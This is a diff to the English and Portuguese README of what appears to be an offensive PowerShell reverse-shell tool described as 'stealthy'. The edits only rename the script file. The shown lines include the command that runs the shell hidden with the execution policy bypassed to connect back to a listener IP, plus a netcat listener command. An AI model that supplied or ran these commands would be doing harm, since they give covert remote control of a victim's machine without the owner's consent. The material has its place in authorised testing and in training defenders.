@@ -23,7 +23,7 @@ A cross-platform compatible, stealthy, and feature-rich PowerShell reverse shell
 
 ## Configuration
 
-Edit the configuration variables at the top of the script (`shell.ps1`) before executing:
+Edit the configuration variables at the top of the script (`RevShell.ps1`) before executing:
 
 ```powershell
 $DEFAULT_IP = "127.0.0.1"       # Listener IP address
@@ -50,7 +50,7 @@ nc -lvnp 4444
 Run the script silently in the background using PowerShell with hidden window style:
 
 ```powershell
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File shell.ps1 192.168.1.100:4444
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File RevShell.ps1 192.168.1.100:4444
 
 ```
 
@@ -105,7 +105,7 @@ Um script de reverse shell em PowerShell altamente funcional, sigiloso e compat�
 
 ## Configuração
 
-Edite as variáveis de configuração no topo do script (`shell.ps1`) antes de executar:
+Edite as variáveis de configuração no topo do script (`RevShell.ps1`) antes de executar:
 
 ```powershell
 $DEFAULT_IP = "127.0.0.1"       # IP do Listener (Atacante)
@@ -132,7 +132,7 @@ nc -lvnp 4444
 Execute o script de forma oculta e sem janelas utilizando o PowerShell:
 
 ```powershell
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File shell.ps1 192.168.1.100:4444
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File RevShell.ps1 192.168.1.100:4444
 
 ```
 
